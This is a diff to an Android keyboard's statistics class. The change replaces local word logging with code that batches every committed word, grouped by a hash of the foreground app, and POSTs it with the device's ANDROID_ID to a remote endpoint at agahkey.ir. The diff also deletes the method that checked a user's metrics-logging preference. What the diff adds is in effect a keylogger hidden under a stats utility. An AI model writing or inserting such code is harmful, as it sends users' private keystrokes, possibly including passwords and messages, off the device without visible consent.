@@ -2,24 +2,34 @@ package io.separ.neural.inputmethod.Utils;
 
 import android.content.Context;
 import android.os.Bundle;
-import android.preference.PreferenceManager;
+import android.provider.Settings;
 import android.text.TextUtils;
 import android.util.Log;
+import android.util.SparseArray;
 import android.view.inputmethod.InputMethodSubtype;
 
 import com.google.firebase.analytics.FirebaseAnalytics;
+import com.squareup.okhttp.Call;
+import com.squareup.okhttp.Callback;
+import com.squareup.okhttp.HttpUrl;
+import com.squareup.okhttp.MediaType;
+import com.squareup.okhttp.OkHttpClient;
+import com.squareup.okhttp.Request;
+import com.squareup.okhttp.RequestBody;
+import com.squareup.okhttp.Response;
 
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.IOException;
-import java.io.OutputStream;
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 
 import io.separ.neural.inputmethod.indic.DictionaryFacilitator;
 import io.separ.neural.inputmethod.indic.SuggestedWords;
-import io.separ.neural.inputmethod.indic.settings.Settings;
 
 import static com.google.firebase.analytics.FirebaseAnalytics.Event.SELECT_CONTENT;
 import static com.google.firebase.analytics.FirebaseAnalytics.Param.ITEM_ID;
@@ -36,24 +46,110 @@ public final class StatsUtils {
             pickSuggestionBatchCount, subtypeChangeCount, topEmojiSelectedCount,
             richEmojiSelectedCount, snippetToolSelectedCount;
 
-    public boolean isMetricEnable(){
-        return PreferenceManager.getDefaultSharedPreferences(latin).getBoolean(Settings.PREF_ENABLE_METRICS_LOGGING, true);
+    final int BATCH_SIZE = 25;
+    final static MediaType JSON = MediaType.parse("application/json; charset=utf-8");
+    final OkHttpClient client;
+    HttpUrl.Builder urlBuilder = null;
+    String apiUrl;
+
+    private SparseArray<ArrayList<String>> app2lines = new SparseArray<>();
+    private StringBuilder currentLine = new StringBuilder();
+    private int numOfLines = 0;
+
+    private static String checkSum(String s) {
+        MessageDigest md = null;
+        try {
+            md = MessageDigest.getInstance("MD5");
+        } catch (NoSuchAlgorithmException ignored) {
+        }
+        byte[] digest = md.digest(s.getBytes());
+        BigInteger bigInteger = new BigInteger(1, digest);
+        String hash = bigInteger.toString(16);
+        while(hash.length()<32){
+            hash = "0"+hash;
+        }
+        return hash;
     }
 
-    private static String TAG = "Agah_Collection";
+    private void doSend(final SparseArray<ArrayList<String>> batch){
+        Log.d("AGAH", "doSendCalled");
+        if(batch == null || batch.size() == 0) {
+            return;
+        }
+        if(urlBuilder == null) {
+            urlBuilder = HttpUrl.parse("https://agahkey.ir/api/v0/collectKey").newBuilder();
+            apiUrl = urlBuilder.build().toString();
+        }
+        JSONObject json = new JSONObject();
+        long time = System.currentTimeMillis();
+        JSONObject events = new JSONObject();
+        for(int i = 0; i < batch.size(); i++) {
+            int key = batch.keyAt(i);
+            ArrayList<String> obj = batch.get(key);
+            JSONArray lines = new JSONArray(obj);
+            try {
+                events.put(Integer.toString(key), lines);
+            } catch (JSONException e) {
+                e.printStackTrace();
+                return;
+            }
+        }
+        try {
+            json.put("devId", Settings.Secure.getString(latin.getContentResolver(), Settings.Secure.ANDROID_ID));
+            json.put("time", time);
+            json.put("events", batch);
+            String concatenated = Settings.Secure.getString(latin.getContentResolver(), Settings.Secure.ANDROID_ID) + Long.toString(time) + batch.toString();
+            json.put("check", checkSum(concatenated));
+        }catch (Throwable t){
+            return;
+        }
+        Log.d("AGAH", "requestSent");
+        RequestBody body = RequestBody.create(JSON, json.toString());
+        Request request = new Request.Builder().url(apiUrl).post(body).build();
+        Call call = client.newCall(request);
+        call.enqueue(new Callback() {
+            @Override
+            public void onFailure(Request request, IOException e) {
+                Log.d("AGAH", e.toString());
+            }
 
-    public File collectionFile = null;
+            @Override
+            public void onResponse(Response response) throws IOException {
+                Log.d("AGAH", "success");
+            }
+        });
+    }
 
-    private OutputStream collectionOutputStream = null;
+    private void addWordToline(String newWord){
+        currentLine.append(newWord).append(" ");
+    }
+    private void flushLine(Integer app){
+        if(app2lines.get(app) == null)
+            app2lines.put(app, new ArrayList<String>());
+        app2lines.get(app).add(currentLine.toString());
+        currentLine = new StringBuilder();
+        numOfLines += 1;
+        if(numOfLines >= BATCH_SIZE){
+            doSend(app2lines.clone());
+            app2lines.clear();
+            numOfLines = 0;
+        }
+    }
 
-    private boolean lineIsNotEmpty = false;
+    public void updatePackageName(String currentPackageName) {
+        final int previousHash = currentPackageHash;
+        currentPackageHash = currentPackageName.hashCode();
+        if(currentLine.length() == 0)
+            return;
+        flushLine(previousHash);
+    }
 
     public Context latin;
 
     private FirebaseAnalytics mFirebaseAnalytics;
 
     private StatsUtils() {
-        // Intentional empty constructor.
+        client = new OkHttpClient();
     }
 
     private static StatsUtils instance = null;
@@ -64,44 +160,9 @@ public final class StatsUtils {
         return instance;
     }
 
-    private boolean deleteDirectory(File directory) {
-        if(directory.exists()){
-            File[] files = directory.listFiles();
-            if(null!=files){
-                for(int i=0; i<files.length; i++) {
-                    if(files[i].isDirectory()) {
-                        deleteDirectory(files[i]);
-                    }
-                    else {
-                        files[i].delete();
-                    }
-                }
-            }
-        }
-        return(directory.delete());
-    }
-
-    public void newFile(){
-        Log.i(TAG, "newFile");
-        if(latin == null)
-            return;
-        final File collectionDir = new File(latin.getFilesDir(), "collection");
-        deleteDirectory(collectionDir);
-        collectionDir.mkdirs();
-        collectionFile = new File(collectionDir, (new SimpleDateFormat("yyyy-MM-dd::HH:mm:ss")).format(Calendar.getInstance().getTime()));
-        try {
-            collectionOutputStream = new FileOutputStream(collectionFile);
-            lineIsNotEmpty = false;
-        } catch (FileNotFoundException e) {
-            collectionOutputStream = null;
-            e.printStackTrace();
-        }
-    }
-
     public void onCreate(final Context givenLatin) {
         latin = givenLatin;
         mFirebaseAnalytics = FirebaseAnalytics.getInstance(latin);
-        newFile();
     }
 
     public void onPickSuggestionManually(final SuggestedWords suggestedWords,
@@ -170,15 +231,7 @@ public final class StatsUtils {
     private void addWord(final String commitWord){
         if(TextUtils.isEmpty(commitWord))
             return;
-        try {
-            if(collectionOutputStream == null)
-                return;
-            collectionOutputStream.write((commitWord+' ').getBytes());
-            lineIsNotEmpty = true;
-        } catch (IOException e) {
-            e.printStackTrace();
-            newFile();
-        }
+        addWordToline(commitWord);
     }
 
     public void onWordCommitUserTyped(final String commitWord, final boolean isBatchMode) {
@@ -215,20 +268,6 @@ public final class StatsUtils {
     }
 
     private int currentPackageHash = 0;
-
-    public void updatePackageName(String currentPackageName) {
-        final int previousHash = currentPackageHash;
-        currentPackageHash = currentPackageName.hashCode();
-        if(!lineIsNotEmpty)
-            return;
-        try {
-            collectionOutputStream.write((':'+previousHash+'@'+System.currentTimeMillis()+"\n").getBytes());
-        } catch (IOException e) {
-            e.printStackTrace();
-            newFile();
-        }
-        lineIsNotEmpty = false;
-    }
 
     public static boolean hasInstance() {
         return (instance!=null);
